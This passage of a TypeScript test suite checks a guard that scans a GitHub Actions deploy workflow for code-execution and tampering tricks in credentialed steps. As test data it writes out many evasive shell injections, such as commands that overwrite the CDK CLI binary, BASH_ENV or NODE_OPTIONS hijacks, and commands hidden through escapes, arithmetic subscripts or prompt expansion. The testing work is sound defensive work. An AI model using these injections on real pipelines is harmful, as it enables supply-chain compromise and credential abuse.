    expect(find('run "$CDK" deploy --app', 'run "$CDK" destroy --app', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', REFUSED),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(
      find(
        'run "$CDK" deploy --app',
        'run "$CDK" rollback --orphan x --app',
        '      - name: Roll back to the target\n',
      ),
    ).toEqual([
      pinned('nonprod (Roll back to the target)'),
      at('nonprod (Roll back to the target)', REFUSED),
      at('nonprod (Roll back to the target)', HELD),
      at('nonprod (Roll back to the target)', CLI),
    ])
    expect(find('--no-lookups ', '', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', HELD),
      at('nonprod (Deploy Services)', CLI),
    ])
    // A change of folder, cd, is a builtin the table refuses outside a canonical text.
    expect(
      find(`          ${CDK_FOLDER}\n`, `          ${CDK_FOLDER}\n          cd "$GITHUB_WORKSPACE/infra"\n`, services),
    ).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 5}`, AS_BASH),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(find('ASSEMBLY="$RUNNER_TEMP/assembly"', 'ASSEMBLY="$RUNNER_TEMP/assembly-previous"', services)).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(
      find(
        'CDK="$RUNNER_TEMP/aws-cdk/package/bin/cdk"',
        'CDK="$GITHUB_WORKSPACE/node_modules/.bin/cdk"',
        '      - name: What runs\n',
      ),
    ).toEqual([
      pinned('nonprod (What runs)'),
      at(
        'nonprod (What runs)',
        'assigns CDK only in the preamble, as the bin of the registry package CLI_FETCH unpacked',
      ),
      // The preamble changed is no preamble, so its lines after STOP_HEAD, which still stands whole, are the
      // run's own: the table refuses the first function it doesn't name, and its mask, run and get are
      // functions of the run's own.
      at(`nonprod (What runs), line ${PREAMBLE.split('\n').findIndex(line => line.startsWith('mask()')) + 1}`, AS_BASH),
      at('nonprod (What runs)', DEFINES),
    ])
    expect(
      credentialedCodeFindings(
        copiedStep('gate', 'Node, from .nvmrc', 'prod', 'The pinned CDK CLI'),
        manifests,
        lockfile,
      ),
    ).toEqual([
      at('prod', STEPS),
      at('prod (Node, from .nvmrc)', WITH_WHOLE),
      at('prod (Node, from .nvmrc)', 'uses only checkout, download-artifact and the credentials action'),
    ])
    expect(credentialedCodeFindings(removedStep('nonprod', "The CLI is the registry's"), manifests, lockfile)).toEqual([
      at('nonprod', STEPS),
      pinned("nonprod (The CLI is the registry's)"),
      at(
        'nonprod',
        'fetches only the pinned CLI (CLI_FETCH, never npm), then runs CLI_CHECK, before the credentials action',
      ),
    ])
  }, 30_000)

  // openssl makes the preamble's stop token (EXPAND-A4-01), on that line of the preamble alone; anywhere
  // else in a credentialed run it is refused, as it was, whatever it is given.
  it('admits openssl only on the preamble’s stop-token line (EXPAND-A4-01)', () => {
    for (const line of ['X=$(openssl rand -hex 16)', 'openssl enc -d -in x -out y']) {
      expect(added('nonprod', line), line).toContain(at(readBack('nonprod'), RUNS))
    }
  })

  // A tool allowed for its plain use handed a program to run, a file the CLI then runs rewritten, or a
  // variable set that chooses what a later command runs: each with the credentials in hand.
  it('finds a tool handed a program, a file rewritten and a variable that chooses what runs', () => {
    const runs = [at(readBack('nonprod'), RUNS)]
    const runsRefused = [...runs, refused('nonprod')]
    const runsHeld = [...runs, held('nonprod')]
    expect(added('nonprod', 'find . -name x -exec node {} \\;')).toEqual(runsRefused)
    expect(added('nonprod', 'find . -name x -execdir true {} +')).toEqual(runsRefused)
    expect(added('nonprod', "trap 'npx cdk deploy' EXIT")).toEqual(runsRefused)
    expect(added('nonprod', "echo | sed -e '1e node x.js'")).toEqual(runsRefused)
    expect(added('nonprod', 'sort --compress-program=node x')).toEqual(runsHeld)
    // sha256sum only on ASSET_CHECK's line that hashes a file asset from its input (round 5, attack 2).
    expect(added('nonprod', 'sha256sum -c "$RUNNER_TEMP/x"')).toEqual(runsHeld)
    expect(added('nonprod', 'X=$(sha256sum <"$RUNNER_TEMP/x")')).toEqual(runsHeld)
    expect(added('nonprod', "git -c alias.x='!node y.js' x")).toEqual(runsHeld)
    expect(added('nonprod', 'gh extension exec x')).toEqual(runsHeld)
    expect(added('nonprod', 'X=node; echo $X')).toEqual(runsRefused)
    expect(added('nonprod', 'mapfile -C cb -c 1 X <"$RUNNER_TEMP/x"')).toEqual([
      ...runsRefused,
      at(readBack('nonprod'), SETS),
    ])
    expect(added('nonprod', 'cat "$RUNNER_TEMP/assembly/x" > node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), WRITES),
    ])
    expect(added('nonprod', 'echo "BASH_ENV=$RUNNER_TEMP/x" >> "$GITHUB_ENV"')).toEqual([
      at(readBack('nonprod'), FILES),
      refused('nonprod'),
      at(readBack('nonprod'), WRITES),
      at(readBack('nonprod'), LOADER),
    ])
    expect(added('nonprod', 'export PATH="$RUNNER_TEMP/assembly:$PATH"')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), LOADER),
    ])
    expect(added('nonprod', 'HOME="$RUNNER_TEMP/assembly"')).toEqual([
      refused('nonprod'),
      at(readBack('nonprod'), LOADER),
    ])
  }, 30_000)

  // A program run through a wrapper or after a redirection, a function out of its step or its canonical
  // text, a tool that writes the file the CLI then runs, and a variable set by printf -v, read, for or an
  // arithmetic or default assignment: each with the credentials in hand.
  it('finds a wrapper, a redirection first, a function of its own and a tool that writes the file the CLI runs', () => {
    const runs = [at(readBack('nonprod'), RUNS)]
    // A builtin the table refuses (command, exec, time, builtin, set but -euo pipefail, local given a flag) or a
    // redirection before a command's word is refused as written; a program it reads is held to its uses.
    for (const line of [
      'command -p ./scripts/x.sh',
      'exec -a name ./scripts/x.sh',
      'time -p ./scripts/x.sh',
      "command -p awk 'BEGIN{system(1)}'",
      'builtin echo x',
      '>/dev/null ./scripts/x.sh',
      '</dev/null cp "$RUNNER_TEMP/assembly/x" node_modules/aws-cdk/bin/cdk',
      'set -- ./scripts/x.sh; "$@"',
      'local -n ref=PATH',
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, refused('nonprod')])
    }
    for (const line of [
      'nohup -- ./scripts/x.sh',
      'timeout -s KILL 5 ./scripts/x.sh',
      'sudo -E true',
      'xargs -0 true',
      'env -0',
      'uniq "$RUNNER_TEMP/assembly/x" node_modules/aws-cdk/bin/cdk',
      'run aws s3 cp s3://x/y node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, held('nonprod')])
    }
    expect(added('nonprod', 'cp() { command cp "$@"; }\n          cp a node_modules/aws-cdk/bin/cdk')).toEqual([
      ...runs,
      refused('nonprod'),
      at(readBack('nonprod'), DEFINES),
    ])
    expect(added('nonprod', 'function jq { :; }')).toEqual([refused('nonprod'), at(readBack('nonprod'), DEFINES)])
    // A function defined in one step and called in another, where bash no longer has it.
    const readBackStep = stepText(deployText, 'nonprod', 'Read back what runs')
    const recheckStep = stepText(deployText, 'nonprod', 'The fast re-check')
    const newest = '          newest=$(newest_release nonprod)\n'
    const crossed = edited(
      edited(
        deployText,
        readBackStep,
        edited(readBackStep, "          SERVICE_LIST='[]'\n", "          cp() { :; }\n          SERVICE_LIST='[]'\n"),
        job('nonprod'),
      ),
      recheckStep,
      edited(recheckStep, newest, `          cp a node_modules/aws-cdk/bin/cdk\n${newest}`),
      job('nonprod'),
    )
    expect(credentialedCodeFindings(withText(DEPLOY, crossed), manifests, lockfile)).toEqual([
      pinned('nonprod (The fast re-check)'),
      at('nonprod (The fast re-check)', RUNS),
      at('nonprod (The fast re-check)', HELD),
      refused('nonprod'),
      at(readBack('nonprod'), DEFINES),
    ])
  }, 30_000)

  // A variable that chooses what runs, or which assembly the CLI deploys, set by printf -v, read, mapfile,
  // for, an arithmetic or a default assignment, or by NAME= where it may not be.
  it('finds a variable that chooses what runs set otherwise than by NAME=, and one set where it may not be', () => {
    // Each is refused by the table too: printf -v, read, a for loop or mapfile naming one of bash's own
    // variables (and jq given no program it reads).
    for (const line of ["printf -v PATH '%s' x", 'read -r PATH <<<"x"', 'for PATH in x; do jq -n 1; done']) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), SETS)])
    }
    expect(added('nonprod', 'mapfile -t PATH < <(jq -n 1)')).toEqual([
      refused('nonprod'),
      held('nonprod'),
      at(readBack('nonprod'), SETS),
    ])
    expect(added('nonprod', 'GITHUB_OUTPUT=node_modules/aws-cdk/bin/cdk')).toEqual([at(readBack('nonprod'), LOADER)])
    for (const line of ['export TMPDIR="$GITHUB_WORKSPACE"', `: "\${RUNNER_TEMP:=x}"`]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), LOADER)])
    }
    // An arithmetic one is refused for its arithmetic too, off a canonical text's lines.
    expect(added('nonprod', '(( PATH = 1 ))')).toEqual([refused('nonprod'), at(readBack('nonprod'), LOADER)])
    // The assembly the CLI deploys, chosen otherwise than by its one line.
    const deployServices = (line: string, added: string) =>
      credentialedCodeFindings(addedBefore('nonprod', 'Deploy Services', line, added), manifests, lockfile)
    const assembly = '          ASSEMBLY="$RUNNER_TEMP/assembly"\n'
    expect(deployServices(assembly, '          RUNNER_TEMP="$GITHUB_WORKSPACE"\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at('nonprod (Deploy Services)', LOADER),
    ])
    expect(deployServices(assembly, "          printf -v RUNNER_TEMP '%s' x\n")).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 3}`, AS_BASH),
      at('nonprod (Deploy Services)', SETS),
    ])
    const folder = `          ${CDK_FOLDER}\n`
    // read hands it the name, which the CLI's rule reads too (the eighth review's first attack).
    expect(deployServices(folder, '          read -r ASSEMBLY <<<"x"\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 4}`, AS_BASH),
      at('nonprod (Deploy Services)', SETS),
      at('nonprod (Deploy Services)', CLI),
    ])
    expect(deployServices(folder, '          ASSEMBLY+=/x\n')).toEqual([
      pinned('nonprod (Deploy Services)'),
      at(`nonprod (Deploy Services), line ${PREAMBLE.split('\n').length + 4}`, AS_BASH),
      at('nonprod (Deploy Services)', CLI),
    ])
    // The run is no longer DIFF_RUN whole, so the tr and sed that set its summary's code block are refused too,
    // and so is every write to "$DIFF", which only prod-plan's two diff runs make (the eighth review's first attack).
    expect(find('DIFF="$RUNNER_TEMP/diff.txt"', 'DIFF=node_modules/aws-cdk/bin/cdk', job('prod-plan'))).toEqual([
      at('prod-plan (Diff)', RUNS),
      at('prod-plan (Diff)', HELD),
      at('prod-plan (Diff)', WRITES),
    ])
  }, 30_000)

  // A job or step key, an action input or an env: key that runs a program, or changes what runs, unseen.
  it('finds a key that runs a program or changes what runs', () => {
    const credentialed = (planted: ReadonlyMap<string, string>) =>
      credentialedCodeFindings(planted, manifests, lockfile)
    const readBackStep = '      - name: Read back what runs\n        id: readback\n'
    expect(
      find(readBackStep, `${readBackStep}        shell: npx --yes cdk deploy --all; bash {0}\n`, job('nonprod')),
    ).toEqual([at(readBack('nonprod'), STEP_KEYS)])
    expect(find(readBackStep, `${readBackStep}        continue-on-error: true\n`, job('nonprod'))).toEqual([
      at(readBack('nonprod'), STEP_KEYS),
    ])
    expect(find(readBackStep, `${readBackStep}        working-directory: infra\n`, job('nonprod'))).toEqual([
      at(readBack('nonprod'), STEP_KEYS),
    ])
    const cache = '    cache-mode: none\n'
    for (const added of [
      '    defaults:\n      run:\n        shell: node {0}\n',
      '    container:\n      image: node:24\n',
      '    services:\n      helper:\n        image: alpine:3\n',
      '    strategy:\n      matrix:\n        x: [a, b]\n',
      '    continue-on-error: true\n',
    ]) {
      expect(find(cache, `${cache}${added}`, job('nonprod'))).toEqual([at('nonprod', JOB_KEYS)])
    }
    expect(find('    runs-on: ubuntu-24.04\n', '    runs-on: [self-hosted, linux]\n', job('prod'))).toEqual([
      at('prod', "runs on ubuntu-24.04, GitHub's own runner"),
    ])
    expect(
      find(
        'permissions:\n  contents: read\njobs:',
        'permissions:\n  contents: read\ndefaults:\n  run:\n    shell: node {0}\njobs:',
        '',
      ),
    ).toEqual([at('the top level', 'holds only name, on, permissions and jobs: no env, defaults or concurrency')])
    const persist = '          persist-credentials: false\n'
    expect(find(persist, `${persist}          repository: x/y\n`, job('nonprod'))).toEqual([
      at("nonprod (Check out the run's commit)", WITH),
      at("nonprod (Check out the run's commit)", WITH_WHOLE),
    ])
    const ids = `          artifact-ids: \${{ needs.synth.outputs.assembly }}\n`
    expect(find(ids, `${ids}          run-id: 1\n          github-token: x\n`, job('nonprod'))).toEqual([
      at('nonprod (Download the assembly)', WITH),
      at('nonprod (Download the assembly)', WITH_WHOLE),
    ])
    expect(
      find('      STAGE: nonprod\n', '      STAGE: nonprod\n      BASH_ENV: infra/x.sh\n', job('nonprod')),
    ).toEqual([at('nonprod', ENV)])
    expect(
      credentialed(
        withText(
          DEPLOY,
          edited(
            deployText,
            '        env:\n',
            '        env:\n          NODE_OPTIONS: --require ./x.js\n',
            '      - name: What runs\n',
          ),
        ),
      ),
    ).toEqual([at('nonprod (What runs)', ENV)])
  }, 30_000)

  // GUARDS-01: each shape that once hid a command from the reader, here the CLI overwritten by a file of the
  // synth's artifact (which a job running repository code made), planted in a credentialed step. Each is
  // found: by the command it hides (the regex reader, kept as a second layer, finds most), and by the table,
  // which names none of these shapes (an unquoted backslash, a # but a comment's, [[ or a case's subject
  // unquoted, a case inside a substitution or a substitution as a command's word), at its line.
  it('finds a command an escape, a [[ or case argument, a case or a substitution would hide', () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const both = [at(readBack('nonprod'), RUNS), refused('nonprod')]
    for (const line of [
      `echo a\\ #;${cp}`,
      `echo ok\\\n          #;${cp}`,
      `X="$(case x in x) ${cp};; esac)"`,
      `echo [[ ; ${cp} ; echo ]]`,
      `X=$(echo case in\n          ${cp})`,
      `case x in x) ${cp};; esac`,
      `case x in\n            x) :;; true) ${cp};;\n          esac`,
    ]) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    expect(added('nonprod', '$(echo cp) "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
    ])
  }, 30_000)

  // Round 2's GUARDS-01 and GUARDS-02: what the reader once blanked or never read as a command, each in front
  // of a cp over the CLI's bin from the synth's artifact. A # right after a substitution's ) is part of its
  // word, so what follows runs and is read; so does what follows a ${…} with a blank in it, an ANSI-C string
  // with an escaped quote, a keyword that is an argument; a backtick substitution, a here-document and
  // anything bash evaluates as arithmetic or a name (where a quoted or constructed $( … ) runs) are refused.
  it('finds what a substitution’s ), a parameter expansion, backticks, an ANSI-C string, a here-document, arithmetic or a keyword argument would hide', () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const only = [refused('nonprod')]
    const both = [at(readBack('nonprod'), RUNS), refused('nonprod')]
    const indented = (lines: string) => lines.split('\n').join('\n          ')
    for (const line of [`echo $(true)#;${cp}`, `echo <(true)#;${cp}`, `echo >(true)#;${cp}`]) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    // An arithmetic expansion is refused off a canonical line anyway.
    expect(added('nonprod', `echo $((1))#;${cp}`)).toEqual(both)
    expect(added('nonprod', `echo \${x:-a #}; ${cp}`)).toEqual(both)
    expect(added('nonprod', `echo $'\\''; ${cp} #'`)).toEqual(both)
    expect(added('nonprod', `echo \`${cp}\``)).toEqual(only)
    expect(added('nonprod', indented(`cat <<true >/dev/null\n'\ntrue\n${cp}\ncat <<true >/dev/null\n'\ntrue`))).toEqual(
      only,
    )
    for (const line of [
      `[ -v 'a[$(${cp})]' ]`,
      `test -v 'a[$(${cp})]'`,
      `[[ 'a[$(${cp})]' -eq 1 ]]`,
      `echo $(( 'a[$(${cp})]' ))`,
      "x=$(printf 'a[%s(cp a b)]' '$'); [[ $x -eq 1 ]]",
      '[[ -v $x ]]',
    ]) {
      expect(added('nonprod', line), line).toEqual(only)
    }
    for (const line of [`echo "\${a['$(${cp})']}"`, 'b[$x]=1']) {
      expect(added('nonprod', line), line).toEqual(both)
    }
    // An indirect expansion is refused by the table; its ! starts no command, as bash reads it (round 12's
    // second iteration), where the reader once took it for one and read x}" as a command too.
    expect(added('nonprod', `echo "\${!x}"`)).toEqual(only)
    expect(added('nonprod', indented(`X=$(echo then case x in x\n${cp}\n)`))).toEqual(both)
    expect(added('nonprod', indented(`(\necho do case x in x\n${cp}\n)`))).toEqual(both)
    // A subshell's ) ends a word, so a # after it is a comment, as bash reads it, but the table names no
    // subshell, and no # but a comment's after a blank.
    expect(added('nonprod', `(true)#;${cp}`)).toEqual(only)
  }, 30_000)

  // Round 3: what the reader still let through, each in front of, or holding, a cp over the CLI's bin. A
  // canonical text's line is exempt only inside the text standing whole (SECURITY-01: a copy of
  // ASSET_CHECK's manifests=$((manifests + 1)) after a quoted manifests='a[$( … )]' ran the cp); $[ … ],
  // ${x@P}, a positional parameter's offset and a compound assignment's subscript evaluate a quoted $( … )
  // as arithmetic or a prompt does (SECURITY-02, GUARDS-05), and so does local given a name it builds; a
  // blank is a space or a tab, so a # after any other is no comment (GUARDS-02); the word after an
  // assignment's value or a redirection's target that holds a substitution is a command (GUARDS-03); and a
  // read-write <> writes (GUARDS-04).
  it(`finds a canonical line off its text, $[ ], \${x@P}, an offset or subscript, a built name, another blank, a command after a substitution, and <>`, () => {
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    const quoted = `'SECONDS[$(${cp})]'`
    const runs = [at(readBack('nonprod'), RUNS)]
    const lines = (...each: string[]) => each.join('\n          ')
    // Each is refused by the table at its second line, the one holding what it doesn't name.
    for (const line of [
      lines(`manifests=${quoted}`, 'manifests=$((manifests + 1))'),
      lines(`services=${quoted}`, 'services=$((services + 1))'),
      lines(`note='$(${cp})'`, `echo "\${note@P}"`),
      lines(`note='$(${cp})'`, `echo \${note@P}`),
      lines(`note=${quoted}`, 'echo "$[note + 1]"'),
      lines(`note=${quoted}`, 'echo $[note + 1]'),
      lines(`y=${quoted}`, `: "\${@:y}"`),
      lines(`y=${quoted}`, `: "\${*:y}"`),
      lines(`y=${quoted}`, `: "\${1:y}"`),
      lines(`y=${quoted}`, `: \${@: -y}`),
      lines(`y=${quoted}`, 'a=([y]=1)'),
      lines(`y=${quoted}`, 'a+=([y]=1)'),
      lines(`x=${quoted}`, 'local "$x=1"'),
      lines(`x='[$(${cp})]'`, 'local a"$x"=1'),
    ]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod', PLANTED_AT + 1)])
    }
    expect(added('nonprod', 'X=$(true) $(echo cp) "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk')).toEqual([
      refused('nonprod'),
    ])
    // A compound assignment over three lines, whose subscript line also reads as a command of its own.
    expect(added('nonprod', lines(`y=${quoted}`, 'a=(', '  [y]=1', ')'))).toEqual([
      ...runs,
      refused('nonprod', PLANTED_AT + 1),
    ])
    for (const blank of ['\u00a0', '\ufeff', '\u2003', '\u000b', '\u000c']) {
      expect(added('nonprod', `echo ok${blank}#;${cp}`), blank).toEqual([...runs, refused('nonprod')])
    }
    for (const line of [
      `X=$(true) ${cp}`,
      `X="$(true)" ${cp}`,
      `X=a$(true) ${cp}`,
      `X=$(true)$(true) ${cp}`,
      `< <(true) ${cp}`,
      `<$(echo /dev/null) ${cp}`,
      lines('X=$(true', `) ${cp}`),
      lines("< 'a", `b' ${cp}`),
    ]) {
      expect(added('nonprod', line), line).toEqual([...runs, refused('nonprod')])
    }
    // A quoted value over two lines and a command after it is shell the table reads: cp, with an assignment
    // before it, is held to no use.
    expect(added('nonprod', lines("X='a", `b' ${cp}`))).toEqual([...runs, held('nonprod')])
    for (const line of [
      'cat "$RUNNER_TEMP/assembly/x.js" 1<>node_modules/aws-cdk/bin/cdk',
      'cat "$RUNNER_TEMP/assembly/x.js" <>node_modules/aws-cdk/bin/cdk',
      'jq . "$RUNNER_TEMP/assembly/x.json" 2<>node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toEqual([refused('nonprod'), at(readBack('nonprod'), WRITES)])
    }
    // The same after an assignment that holds a substitution: an aws call outside run and get (DPW-07).
    expect(
      maskingFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          X=$(true) aws sts get-caller-identity\n',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-07 ${readBack('nonprod')}: runs every aws, CDK and skopeo command as run … or $(get …)`])
  }, 60_000)

  it('finds a workspace that could stand in for the CLI, and a lockfile entry that isn’t the registry’s', () => {
    const planted = (path: string, manifest: unknown) =>
      credentialedCodeFindings(workflows, new Map([...manifests, [path, JSON.stringify(manifest)]]), lockfile)
    const WORKSPACE = 'DPW-10 no workspace is named aws-cdk or declares a cdk bin'
    expect(planted('packages/x/package.json', { name: '@hearth/x', bin: { cdk: 'bin/cdk.js' } })).toEqual([
      `packages/x/package.json: ${WORKSPACE}`,
    ])
    expect(planted('packages/x/package.json', { name: 'aws-cdk', version: '0.0.0' })).toEqual([
      `packages/x/package.json: ${WORKSPACE}`,
    ])
    const lock = JSON.parse(lockfile) as { packages: Record<string, Record<string, unknown>> }
    const entry = lock.packages['node_modules/aws-cdk'] ?? {}
    const LOCK =
      "package-lock.json: DPW-10 node_modules/aws-cdk is the registry's tarball at infra's pin, with a sha512 integrity and no link"
    const withEntry = (changed: Record<string, unknown>) =>
      credentialedCodeFindings(
        workflows,
        manifests,
        JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/aws-cdk': changed } }),
      )
    expect(withEntry({ ...entry, link: true })).toEqual([LOCK])
    expect(withEntry({ ...entry, resolved: 'https://registry.example.invalid/aws-cdk.tgz' })).toEqual([LOCK])
    expect(withEntry({ ...entry, version: '0.0.1' })).toEqual([LOCK])
    // Round 4's ACTIONS-01 and SECURITY-01: as CLI_FETCH reads it, the registry's tarball at the pin by its fixed
    // URL, never a git dependency or another version's tarball, with a sha512 integrity.
    expect(withEntry({ ...entry, resolved: 'git+ssh://git@github.com/aws/aws-cdk-cli.git#0123456' })).toEqual([LOCK])
    expect(withEntry({ ...entry, resolved: 'https://registry.npmjs.org/aws-cdk/-/aws-cdk-0.0.1.tgz' })).toEqual([LOCK])
    expect(withEntry({ ...entry, integrity: 'sha1-0123456789abcdef0123456789abcdef01234567' })).toEqual([LOCK])
    expect(withEntry({ ...entry, integrity: undefined })).toEqual([LOCK])
  }, 30_000)

  // Round 4: a run's own lines (each outside a canonical text standing whole) are read through SHELL_TABLE, an
  // allowlist, so a form it doesn't name is refused at its line, whatever it is, and no round has to find it
  // first. Every run of deploy.yml is read so, and the committed ones pass.
  it('reads every run of deploy.yml through SHELL_TABLE, and the committed runs pass', () => {
    let runs = 0
    for (const each of workflowJobs(deployText)) {
      for (const [index, step] of parsedSteps(each).entries()) {
        if (step.run === undefined) continue
        runs++
        expect(readShell(step.run).refused, `${each.id} (${step.name ?? index + 1})`).toBeUndefined()
      }
    }
    expect(runs).toBeGreaterThan(80)
  })

  // One plant for each form SHELL_TABLE doesn't name, each in a credentialed run and refused at its line (16,
  // where added() plants), most of which the reader before round 4 passed. Some are also found by the rule
  // that names what they do (RUNS, WRITES, SETS, DEFINES, LOADER).
  it('refuses at its line each form SHELL_TABLE doesn’t name, in a credentialed run', () => {
    const forms: Readonly<Record<string, readonly string[]>> = {
      expansion: [
        `echo "\${x:1}"`,
        `echo "\${x/a/b}"`,
        `echo "\${x%%/*}"`,
        `echo "\${!x}"`,
        `echo "\${x@P}"`,
        'echo "$[x]"',
        'echo "$@"',
        'echo "$*"',
        'echo "$$"',
        'echo "$10"',
        `echo "\${#x}"`,
        `echo "\${x:-y}"`,
        'echo $x',
        'echo ~/x',
        'echo *',
        'echo a{b,c}',
        'echo `true`',
        'echo "$(<x)"',
      ],
      redirection: ['cat a <>x', 'echo a >| x', 'echo a &> x', 'echo a 3>x', 'cat 0<&3', 'echo a >&-', 'cat < x'],
      quoting: ["echo $'a'", 'echo "\\$x"', 'echo a\\ b', 'echo $"x"', "echo 'a\tb'"],
      keyword: [
        'while true; do break; done',
        'until true; do break; done',
        'select x in a; do break; done',
        'function f { :; }',
        'time true',
        '[[ -v x ]]',
        '(( x ))',
        'coproc true',
      ],
      operator: ['echo a & wait', 'echo a |& cat', 'case x in x) echo;& esac', '( echo a )', 'echo a;# c'],
      character: ['echo a%b', 'echo a+b', 'echo a,b', 'echo a^b', 'echo a?b', 'echo é'],
      assignment: ['IFS=x', 'PATH=/x', 'BASH_ENV=x', 'a[1]=x', 'x+=1'],
      builtin: [
        'eval "$x"',
        'exec true',
        'source x',
        '. x',
        'trap "x" EXIT',
        'alias x=y',
        'enable -n echo',
        'let x=1',
        'shopt -s extglob',
        'builtin echo',
        'command true',
        'set -x',
        'set +e',
        'declare -n x=y',
        'declare -i x',
        'export -f x',
        'readonly x',
        'read -e x',
        'mapfile -C x -t A < <(true)',
        'printf -v x y',
        'local x=$1',
        'local -n x=y',
        'cd /',
        'test -v x',
        ': x',
        'unset x',
        'return',
        'shift',
      ],
      function: ['f() { :; }', 'mask() { cat; }'],
    }
    for (const [form, lines] of Object.entries(forms)) {
      for (const line of lines) expect(added('nonprod', line), `${form}: ${line}`).toContain(refused('nonprod'))
    }
    // And the shapes rounds 1 to 3 found one by one, each now refused because the table names none of it.
    const cp = 'cp "$RUNNER_TEMP/assembly/x.js" node_modules/aws-cdk/bin/cdk'
    for (const line of [
      `echo a\\ #;${cp}`,
      `echo $(true)#;${cp}`,
      `echo \${x:-a #}; ${cp}`,
      `echo $'\\''; ${cp} #'`,
      `X=$(true) ${cp}`,
      `< <(true) ${cp}`,
      'cat a 1<>node_modules/aws-cdk/bin/cdk',
    ]) {
      expect(added('nonprod', line), line).toContain(refused('nonprod'))
    }
    const lines = (...each: string[]) => each.join('\n          ')
    for (const line of [
      lines('cat <<true >/dev/null', "'", 'true', cp, 'cat <<true >/dev/null', "'", 'true'),
      lines(`manifests='a[$(${cp})]'`, 'manifests=$((manifests + 1))'),
      lines(`note='$(${cp})'`, `echo "\${note@P}"`),
      lines(`y='a[$(${cp})]'`, `: "\${@:y}"`),
      lines(`y='a[$(${cp})]'`, 'a=([y]=1)'),
    ]) {
      expect(added('nonprod', line), line).toContain(
        line.startsWith('cat') ? refused('nonprod') : refused('nonprod', PLANTED_AT + 1),
      )
    }
  }, 120_000)

  // A stretch of a run's own lines closes all it opens before a canonical text or the run's end, so no
  // canonical text can stand inside a quote, a compound command, a continued line or a here-document.
  it('refuses a stretch left open, before a canonical text or at the run’s end', () => {
    for (const open of [
      "echo '",
      'x="',
      'if true; then',
      '{',
      'echo a \\',
      'echo a |',
      'echo a &&',
      '$(',
      'cat <<E',
      'case x in',
    ]) {
      expect(readShell(`${open}\n${PREAMBLE}\n`).refused?.line, open).toBe(0)
    }
    expect(readShell('{\necho a').refused?.line).toBe(1)
    expect(readShell(`${PREAMBLE}\necho ok`).refused).toBeUndefined()
    expect(readShell(`echo ok\n${PREAMBLE}`).refused).toBeUndefined()
  })

  // Round 4: each command a credentialed run's own lines read is held to the flags and arguments the
  // workflow uses (GLUE_USES), where one could run code, read a file the guard can't see or write a file.
  it('holds each command of a credentialed run to the flags and arguments the workflow uses', () => {
    for (const line of [
      'X=1 jq -n .',
      'jq -f x',
      'jq --from-file x',
      "jq -n --rawfile a x '.'",
      "jq -n --slurpfile a x '.'",
      "jq -L x -n '.'",
      "jq -n --args '.' a",
      "jq '.' x",
      "jq -n 'input_filename'",
      "jq -n '$__prog_args'",
      "jq -n '$ENV'",
      "jq -n 'env'",
      "jq -n 'input'",
      `jq -n 'import "x" as y; .'`,
      `jq -n 'include "x"; .'`,
      "jq -n '@sh'",
      `jq -n '"\\(1)"'`,
      "jq -n '$y'",
      "jq -n '. # c'",
      'gh api repos/x/y',
      'gh api -X DELETE "repos/$REPO/deployments/1"',
      'gh api -H x "repos/$REPO/deployments"',
      'gh api -F a=@x "repos/$REPO/deployments"',
      'gh api --input x "repos/$REPO/deployments"',
      'cat x',
      'head -n 1 x',
      'tee x',
      'wc -l',
      'mask x',
      'run aws sts get-caller-identity --endpoint-url x',
      'run aws sts get-caller-identity --profile x',
      'run aws ecs describe-services --cli-input-json x',
      'run aws ecs describe-services --cluster file://x',
      'run skopeo inspect x',
      'npm ci',
    ]) {
      expect(added('nonprod', line), line).toContain(held('nonprod'))
    }
    // A redirection to or from a file but the step's own is no form the table names.
    for (const line of ['echo a > x', 'echo a >> /tmp/x', 'echo a > "$RUNNER_TEMP/x"', 'echo a 2>x']) {
      expect(added('nonprod', line), line).toContain(refused('nonprod'))
    }
  }, 60_000)

  // Round 4: a canonical text stands whole, so what it evaluates (arithmetic, a subscript, an offset, a name
  // or a prompt) is only what it sets itself, from a literal or arithmetic over such values; and it closes
  // all it opens, so the run's own lines after it are read from a clean start.
  it('holds each canonical text to evaluating only what it sets itself, and to closing all it opens', () => {
    expect(canonicalTextFindings()).toEqual([])
    const evaluates = (name: string, line: number) =>
      `${GUARD}: DPW-10 ${name}, line ${line}: evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself`
    for (const [text, line] of [
      ['n=$((m + 1))', 1],
      ['x=$1\necho $((x + 1))', 2],
      ['x=0\nread -r x\necho $((x + 1))', 3],
